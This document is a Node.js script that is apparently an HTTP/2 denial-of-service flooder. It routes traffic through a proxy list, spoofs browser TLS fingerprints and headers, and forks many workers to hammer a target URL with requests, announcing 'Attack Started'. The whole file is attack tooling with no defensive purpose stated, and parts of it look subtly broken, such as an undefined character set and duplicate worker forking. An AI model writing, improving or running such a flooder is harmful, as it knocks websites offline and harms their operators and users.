process.on('uncaughtException', function(er) {
    // Handle uncaught exceptions
});
process.on('unhandledRejection', function(er) {
    // Handle unhandled rejections
});

process.on("SIGHUP", () => {
    return 1;
});
process.on("SIGCHLD", () => {
    return 1;
});

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 7) {
    console.log(`Usage: node ${file} <target> <time> <rate> <threads> <proxy_list> <optional_cookie>`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomCharacters(length) {
    let output = "";
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
}

const accept_header = [
    // Add your accept headers here
],
    cache_header = [
        'max-age=0',
        'no-cache',
        'no-store',
        'must-revalidate',
        'proxy-revalidate'
    ],
    language_header = [
        'ru-RU,ru;q=0.9',
        'en-US,en;q=0.9'
    ],
    dest_header = [
        'document',
        'script',
        'style'
    ],
    mode_header = [
        'cors',
        'navigate'
    ],
    site_header = [
        'cross-site',
        'same-origin'
    ];

var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    const dateObj = new Date();
    for (let i = 0; i < process.argv[5]; i++) {
        cluster.fork();
        console.log(`Threads use: ${i} `);
    }
    console.log("Attack Started");
    console.log(`Timestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);
    setTimeout(() => { }, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else { setInterval(runFlooder) }

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "403");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "403");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "403");
        });
    }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
headers["accept-encoding"] = "gzip, deflate, br";
headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers["pragma"] = "no-cache";
headers["sec-ch-ua"] = '"Chromium";v="108", "Opera GX";v="94", "Not)A;Brand";v="99"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers["sec-fetch-user"] = "?1";
headers["upgrade-insecure-requests"] = "1";
headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0";
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    headers[":authority"] = parsedTarget.host
    headers["x-forwarded-for"] = parsedProxy[0];
    headers["x-forwarded-proto"] = "https";
    const proxyOptions = {
        host: parsedProxy[0],
        port: parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2"],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: url.hostname,
            host: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        const ClientHttp2Session = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                enablePush: true
            },
            maxOutstandingPings: 1337,
            maxOutstandingSettingsAck: 1337,
            maxSessionMemory: 1337,
            maxHeaderListPairs: 1337,
            maxConcurrentStreams: 1337,
            maxSettings: 1337,
            peerMaxConcurrentStreams: 1337,
            maxReadQueueSize: 0xFFFFFF
        }, () => {
            for (let counter = 0; counter < args.rate; counter++) {
                headers["cookie"] = randomCharacters(32) + Math.random() + Math.random() + Math.random();
                const ClientHttp2Stream = ClientHttp2Session.request(headers);
                ClientHttp2Stream.setEncoding("utf8");

                ClientHttp2Stream.on("data", chunk => { });
                ClientHttp2Stream.on("response", headers => {
                    ClientHttp2Stream.close();
                    return;
                });

                ClientHttp2Stream.end();
            }
        });

        ClientHttp2Session.setEncoding("utf8");

        ClientHttp2Session.on("socketError", error => {
            ClientHttp2Session.destroy();
        });

        ClientHttp2Session.on("goaway", () => {
            ClientHttp2Session.destroy();
        });

        ClientHttp2Session.on("error", error => {
            ClientHttp2Session.destroy();
        });

        ClientHttp2Session.on("close", () => {
            ClientHttp2Session.destroy();
        });
    });
}
